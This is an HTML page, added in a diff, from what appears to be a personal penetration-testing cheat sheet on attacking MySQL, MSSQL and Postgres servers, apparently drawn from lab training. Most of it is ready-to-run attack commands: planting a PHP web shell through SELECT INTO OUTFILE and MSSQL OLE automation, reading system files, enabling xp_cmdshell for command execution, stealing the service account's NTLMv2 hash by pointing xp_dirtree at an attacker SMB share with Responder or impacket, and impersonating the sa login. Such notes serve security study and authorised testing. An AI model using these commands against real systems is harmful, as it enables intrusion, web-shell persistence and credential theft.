@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/Services/SQL.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/Services/SQL.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Services/SQL.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="mysql">MySQL</h1>
+<h2 id="interaction">Interaction</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-h</span> &lt;IP&gt;
+<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-pP4SSw0rd</span> <span class="nt">-h</span> &lt;IP&gt; <span class="nt">-P</span> 3306
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>show databases;</td>
+      <td>Show all databases.</td>
+    </tr>
+    <tr>
+      <td>use <database>;</database></td>
+      <td>Select one of the existing databases.</td>
+    </tr>
+    <tr>
+      <td>show tables;</td>
+      <td>Show all available tables in the selected database.</td>
+    </tr>
+    <tr>
+      <td>show columns from &lt;table&gt;;</td>
+      <td>Show all columns in the selected database.</td>
+    </tr>
+    <tr>
+      <td>select * from &lt;table&gt;;</td>
+      <td>Show everything in the desired table.</td>
+    </tr>
+    <tr>
+      <td>select * from &lt;table&gt; where <column> = "<string>";</string></column></td>
+      <td>Search for the needed string in the desired table.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="footprinting">Footprinting</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap &lt;IP&gt; <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p3306</span> <span class="nt">--script</span> mysql<span class="k">*</span>
+</code></pre></div></div>
+
+<h2 id="write-local-file">Write Local File</h2>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="nv">"&lt;?php echo shell_exec($_GET['c']);?&gt;"</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'/var/www/html/webshell.php'</span><span class="p">;</span>
+
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.</p>
+
+<p>secure_file_priv may be set as follows:</p>
+
+<ul>
+  <li>If empty, the variable has no effect, which is not a secure setting.</li>
+  <li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
+  <li>If set to NULL, the server disables import and export operations.</li>
+</ul>
+
+<p>In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:</p>
+
+<h2 id="read-local-files">Read Local Files</h2>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="nv">"/etc/passwd"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="secure-file-privileges">Secure File Privileges</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; show variables like "secure_file_priv";
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+
+1 row in set (0.005 sec)
+</code></pre></div></div>
+
+<h1 id="mssql">MSSQL</h1>
+<h2 id="interaction-1">Interaction</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> julio <span class="nt">-pPassword123</span> <span class="nt">-h</span> &lt;IP&gt;
+<span class="nv">$ </span>python3 mssqlclient.py Administrator@10.129.201.248 <span class="nt">-windows-auth</span>
+<span class="nv">$ </span>mssqlclient.py <span class="nt">-windows-auth</span> &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;
+<span class="nv">$ </span>mssqlclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;
+
+<span class="nv">$ </span>sqsh <span class="nt">-S</span> &lt;IP&gt; <span class="nt">-U</span> julio <span class="nt">-P</span> <span class="s1">'MyPassword!'</span> <span class="nt">-h</span>
+
+<span class="o">&gt;</span> sqlcmd <span class="nt">-S</span> SRVMSSQL <span class="nt">-U</span> julio <span class="nt">-P</span> <span class="s1">'MyPassword!'</span> <span class="nt">-y</span> 30 <span class="nt">-Y</span> 30
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>SELECT name FROM master.dbo.sysdatabases;</td>
+      <td>Show all databases.</td>
+    </tr>
+    <tr>
+      <td>USE htbusers</td>
+      <td>Select one of the existing databases.</td>
+    </tr>
+    <tr>
+      <td>SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;</databaseName></td>
+      <td>Show all available tables in the selected database.</td>
+    </tr>
+    <tr>
+      <td>SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>SELECT * FROM Employees.dbo.employee_information;</td>
+      <td>Show everything in the desired table.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="footprinting-1">Footprinting</h2>
+<h2 id="nmap-mssql-script-scan">NMAP MSSQL Script Scan</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 10.129.201.248
+</code></pre></div></div>
+
+<h2 id="mssql-ping-in-metasploit">MSSQL Ping in Metasploit</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msf6 auxiliary(scanner/mssql/mssql_ping)
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a “hidden” mode, it uses the TCP/2433 port. We can use Nmap’s default scripts -sC option to enumerate database services on a target system:</p>
+
+<h3 id="banner-grabbing">Banner Grabbing</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -Pn -sV -sC -p1433 10.10.10.125
+</code></pre></div></div>
+
+<h2 id="execute-commands">Execute Commands</h2>
+<ul>
+  <li>xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure</li>
+  <li>The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account</li>
+  <li>xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed</li>
+</ul>
+
+<h3 id="xp_cmdshell">XP_CMDSHELL</h3>
+<p>enable_xp_cmdshell</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; xp_cmdshell 'whoami'
+2&gt; GO
+
+xp_cmdshell whoami /priv
+
+output
+-----------------------------
+no service\mssql$sqlexpress
+NULL
+(2 rows affected)
+</code></pre></div></div>
+
+<h4 id="enable-xp_cmdshell">Enable XP_CMDSHELL</h4>
+<p>If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+</code></pre></div></div>
+
+<h2 id="write-local-files">Write Local Files</h2>
+<p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>
+
+<h3 id="mssql---enable-ole-automation-procedures">MSSQL - Enable Ole Automation Procedures</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; sp_configure 'show advanced options', 1
+2&gt; GO
+3&gt; RECONFIGURE
+4&gt; GO
+5&gt; sp_configure 'Ole Automation Procedures', 1
+6&gt; GO
+7&gt; RECONFIGURE
+8&gt; GO
+</code></pre></div></div>
+
+<h3 id="create-a-file">Create a File</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; DECLARE @OLE INT
+2&gt; DECLARE @FileID INT
+3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
+6&gt; EXECUTE sp_OADestroy @FileID
+7&gt; EXECUTE sp_OADestroy @OLE
+8&gt; GO
+</code></pre></div></div>
+
+<h2 id="read-local-files-1">Read Local Files</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2&gt; GO
+</code></pre></div></div>
+
+<h2 id="capture-mssql-service-hash">Capture MSSQL Service Hash</h2>
+<p>We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>
+
+<p>To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:</p>
+<h2 id="xp_dirtree-hash-stealing">XP_DIRTREE Hash Stealing</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2&gt; GO
+</code></pre></div></div>
+
+<h2 id="xp_subdirs-hash-stealing">XP_SUBDIRS Hash Stealing</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2&gt; GO
+</code></pre></div></div>
+
+<h2 id="xp_subdirs-hash-stealing-with-responder">XP_SUBDIRS Hash Stealing with Responder</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo responder -I tun0
+</code></pre></div></div>
+
+<h2 id="xp_subdirs-hash-stealing-with-impacket">XP_SUBDIRS Hash Stealing with impacket</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo impacket-smbserver share ./ -smb2support
+</code></pre></div></div>
+
+<h1 id="impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</h1>
+<h2 id="identify-users-that-we-can-impersonate">Identify Users that We Can Impersonate</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; SELECT distinct b.name
+2&gt; FROM sys.server_permissions a
+3&gt; INNER JOIN sys.server_principals b
+4&gt; ON a.grantor_principal_id = b.principal_id
+5&gt; WHERE a.permission_name = 'IMPERSONATE'
+6&gt; GO
+</code></pre></div></div>
+
+<h2 id="verifying-our-current-user-and-role">Verifying our Current User and Role</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; SELECT SYSTEM_USER
+2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
+3&gt; go
+</code></pre></div></div>
+
+<h2 id="impersonating-the-sa-user">Impersonating the SA User</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; EXECUTE AS LOGIN = 'sa'
+2&gt; SELECT SYSTEM_USER
+3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
+4&gt; GO
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.</code></p>
+
+<h1 id="communicate-with-other-databases-with-mssql">Communicate with Other Databases with MSSQL</h1>
+<h2 id="identify-linked-servers-in-mssql">Identify linked Servers in MSSQL</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; SELECT srvname, isremote FROM sysservers
+2&gt; GO
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2&gt; GO
+</code></pre></div></div>
+
+<h1 id="postgres">POSTGRES</h1>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">psql -h 127.0.0.1 -U postgres</code> - Connect DB</li>
+  <li><code class="language-plaintext highlighter-rouge">\l</code> - List all databases</li>
+  <li><code class="language-plaintext highlighter-rouge">\c “db”;</code> - Select DB</li>
+  <li><code class="language-plaintext highlighter-rouge">\dt;</code> - List all tables</li>
+  <li><code class="language-plaintext highlighter-rouge">Select * from users;</code> - Dump table data</li>
+</ul>
+
+      </section>
+    </div>
+  </body>
+</html>
